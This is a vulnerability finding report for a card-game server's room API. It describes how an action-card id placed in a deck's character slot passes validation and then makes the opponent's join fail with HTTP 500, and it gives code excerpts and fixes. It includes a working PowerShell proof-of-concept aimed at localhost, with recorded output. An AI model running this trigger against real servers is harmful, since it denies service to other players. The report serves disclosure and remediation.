# F-005 — an action-card id in the `characters` slot passes the deck validator, then the opponent's join answers HTTP 500

- **Status:** REPRODUCED LIVE (3/3 repetitions × 3 triggers + control). Server built from this repository (`454ea43c`), local `http://127.0.0.1:3000`.
- **Severity:** high — unauthenticated (guest room creation + guest join), remote, deterministic, two requests.
- **Class:** CWE-843 (type confusion) + CWE-248 (uncaught exception).
- **Affected:** `packages/server`, `packages/core`, `packages/assets-manager`.
- **Route:** `POST /api/rooms` then `POST /api/rooms/:roomId/players`.

## Summary

`verifyDeck()` (`packages/server/src/utils.ts:73-165`) resolves **every** deck id through one flat
lookup, `ASSETS_MANAGER.getData(id)`. That lookup is keyed by id alone — characters and action cards
live in the same id-keyed map — and although every datum carries its own
`category: "characters" | "action_cards"`, the validator never reads it. The character branch only
checks that the datum has a numeric `shareId` and a `tags` array:

```ts
const character = await getData<CharacterRawData>(chId);   // utils.ts:94
if (!character) { throw new DeckVerificationError(DEC.NotFoundError, `character id ${chId} not found`); }
if (typeof character.shareId !== "number") { throw new DeckVerificationError(DEC.NotFoundError, `character id ${chId} not obtainable`); }
characterTags.push(...character.tags);                     // utils.ts:107
versions.add(character.sinceVersion);                      // utils.ts:108
```

An **action card** datum satisfies all of that, so a guest can create a room whose `characters` array
contains card ids:

1. `POST /api/rooms` with `characters: [311101, 1102, 1103]` → **201** (the deck is "valid").
2. Any second player joins: `Room.start()` → `InternalGame.createInitialState()` → `initPlayerState()`
   (`packages/core/src/game.ts:140-148`) resolves the same ids in `data.characters`, finds nothing and
   throws `GiTcgDataError("Unknown character id 311101")`; `Room.start()`
   (`packages/server/src/rooms/rooms.service.ts:549-565`) catches it, stops the room and rethrows
   `InternalServerErrorException` → **HTTP 500 for the joining player**.
3. The room is destroyed by that failure: `GET /api/rooms/:roomId` afterwards → **404**.
4. The public validator agrees with the attacker: `POST /api/decks/version` with the same deck → **201**.

**Distinct root cause** (not a re-run of the earlier findings):

| finding | what is wrong | where it fails |
| --- | --- | --- |
| F-001 | the *cards* loop dereferences `.tags` on a datum that has none (keyword id) → `TypeError` | create → 500 |
| F-004 | two data sources disagree about a card's `sinceVersion` | join → 500 |
| **F-005** | **no data disagreement: the id is valid, obtainable, correctly versioned and present in both data sets — only its *kind* is wrong, and no code compares kinds** | **join → 500** |

Nothing here is a random collision: `311101`/`311102`/`311103` are ordinary, obtainable starter
cards, and *any* obtainable action-card id reproduces it. Conversely the mirror case is rejected — a
*character* id inside `cards` fails in the card branch — so the asymmetry is easy to miss.

## Reproduction

Assumes the local server is running on `http://127.0.0.1:3000` (`GET /api/hello` -> `Hello World!`).
Each trigger creates a room with a card id in a character slot, then joins it with a clean deck.
Paste this into PowerShell:

```powershell
$base  = "http://127.0.0.1:3000"
$clean = @(311101,311102,311103,311104,311105,311106,311107,311108,311109,311110,311111,311112,311201,311202,311203) * 2
$cases = [ordered]@{
  "C0 control"  = @(1101,1102,1103)      # 3 real characters -> join 201
  "T1 card"     = @(311101,1102,1103)    # action card in a character slot -> join 500
  "T2 other"    = @(211011,1102,1103)    # entity/other-kind id in a slot     -> join 500
  "T3 all-card" = @(311101,311102,311103)# three action cards                  -> join 500
}
foreach ($k in $cases.Keys) {
  $create = Invoke-WebRequest -Method POST -Uri "$base/api/rooms" -ContentType application/json `
    -Body (@{ name = "f005-$k"; deck = @{ characters = $cases[$k]; cards = $clean } } | ConvertTo-Json -Compress -Depth 6) `
    -SkipHttpErrorCheck -UseBasicParsing
  $roomId = ($create.Content | ConvertFrom-Json).room.id
  $join = Invoke-WebRequest -Method POST -Uri "$base/api/rooms/$roomId/players" -ContentType application/json `
    -Body (@{ name = "f005-join-$k"; deck = @{ characters = @(1101,1102,1103); cards = $clean } } | ConvertTo-Json -Compress -Depth 6) `
    -SkipHttpErrorCheck -UseBasicParsing
  $after = (Invoke-WebRequest -Uri "$base/api/rooms/$roomId" -SkipHttpErrorCheck -UseBasicParsing).StatusCode
  "{0,-11} create {1} | join {2} | after {3}" -f $k, $create.StatusCode, $join.StatusCode, $after
}

# the public validator approves the poisoned deck, exactly like the room route did
(Invoke-WebRequest -Method POST -Uri "$base/api/decks/version" -ContentType application/json `
  -Body (@{ name = "f005-ver"; characters = @(311101,1102,1103); cards = $clean } | ConvertTo-Json -Compress -Depth 6) `
  -SkipHttpErrorCheck -UseBasicParsing).StatusCode
```

Recorded output (3/3 repetitions identical):

```
C0 control  create 201 | join 201 | after 200
T1 card     create 201 | join 500 | after 404
T2 other    create 201 | join 500 | after 404
T3 all-card create 201 | join 500 | after 404
201
```

Full 500 body for every trigger:

```json
{"message":"Failed to create initial game state: Error: Unknown character id 311101\n; propably due to invalid decks","error":"Internal Server Error","statusCode":500}
```

(`T2` reports `Unknown character id 211011` instead.) The server itself stays healthy
(`GET /api/hello` -> 200) — the 500 lands on the *joining* player, not on the party that supplied the
bad deck.

## Buggy code

`packages/server/src/utils.ts:92-109` — the character branch never checks the datum's kind (the
datum's own `category` field is never consulted):

```ts
const characterTags = [];
for (const chId of characters) {
  const character = await getData<CharacterRawData>(chId);
  if (!character) {
    throw new DeckVerificationError(DEC.NotFoundError, `character id ${chId} not found`);
  }
  if (typeof character.shareId !== "number") {
    throw new DeckVerificationError(DEC.NotFoundError, `character id ${chId} not obtainable`);
  }
  characterTags.push(...character.tags);
  versions.add(character.sinceVersion);
}
```

`packages/assets-manager/src/manager.ts:300` / `:327` — one id-keyed cache holds both kinds, so
`getData(id)` (`manager.ts:409`) cannot tell the caller which kind it returned:

```ts
this.dataCacheSync.set(ch.id, data);     // characters
...
this.dataCacheSync.set(ac.id, data);     // action cards  (same map)
```

`packages/core/src/game.ts:140-148` — the engine requires `data.characters.get(id)` to succeed:

```ts
const characterDefs: readonly CharacterDefinition[] = deck.characters.map((id) => {
  const def = data.characters.get(id);
  if (typeof def === "undefined") {
    throw new GiTcgDataError(`Unknown character id ${id}`);
  }
  return def;
});
```

`packages/server/src/rooms/rooms.service.ts:549-565` — any `createInitialState` failure stops the
room and becomes `InternalServerErrorException` (HTTP 500):

```ts
} catch (e) {
  this.stop();
  throw new InternalServerErrorException(
    `Failed to create initial game state: ${e}; propably due to invalid decks`,
  );
}
```

## Fix

1. Make the validator read the kind it already has: assert `character.category === "characters"` /
   `card.category === "action_cards"` (or split `getData` into `getCharacterData` /
   `getActionCardData`) before touching kind-specific fields, and report a `DeckVerificationError`
   (400) otherwise.
2. Reject *any* unknown-kind id in one place: the id spaces of characters, action cards, skills,
   entities and keywords overlap (a negative id is a keyword, see F-001), so "found something" must
   never be enough.
3. Give `verifyDeck()` the same data source the engine will use (`getData(room.config.gameVersion)`
   from `packages/data`) and check the ids against `data.characters` / `data.entities` for that
   version, so "what the validator accepts" and "what the engine can build" cannot diverge (this also
   removes the F-004 class of failure).
4. Do not answer 500 for a malformed deck and do not destroy the room: validate at
   `createRoom()`/`joinRoom()` time and return 400 while both decks are still available.
5. Keep `POST /api/decks/version` and room creation consistent — today the same deck is 201 on one
   route and 500 on the other.

## Principle

- **Validation must check the kind of a value, not just the presence of the fields it happens to
  read.** A flat, id-keyed lookup answers "does this id exist *somewhere*", which is a different
  question from "is this id a character".
- **Two components that consume the same data must agree on the data's shape.** Here the validator
  and the engine both read "a deck", but only the engine enforces the entity kind, and the failure
  surfaces one step later, in a different player's request.
- **Type confusion at a trust boundary is constructible, not random.** The attacker does not need the
  engine's internals: an id from any other table of the same data set is enough.
- **An invalid-input path that answers 500 is a defect even without a crash**, and a 500 that lands
  on a *different* player than the one who supplied the input is both a denial of service and a
  misleading error.

## Server not running yet?

```powershell
pnpm install --frozen-lockfile
pnpm build "server..."
pnpm --filter @gi-tcg/server dev     # repo dev entrypoint: starts @prisma/dev (PGlite) + the server
# sanity check:  curl http://127.0.0.1:3000/api/hello   ->   Hello World!
```

## Harness bookkeeping (not needed to reproduce)

- Probe `S5` (`security-harness/probes/S5-deck-slot-type-confusion.probe.mjs`, `expect: internal-error`, `expectAfterFix: handled`).
- Recorded probe run: `security-harness/evidence/<runId>/S5-deck-slot-type-confusion.json`.
- First raw capture: `security-harness/evidence/2026-09-11T18-41-15-586Z/slot-type/`
  (`C0-rep*.json`, `T1-rep*.json` … `T4-rep*.json`, `SUMMARY.json`).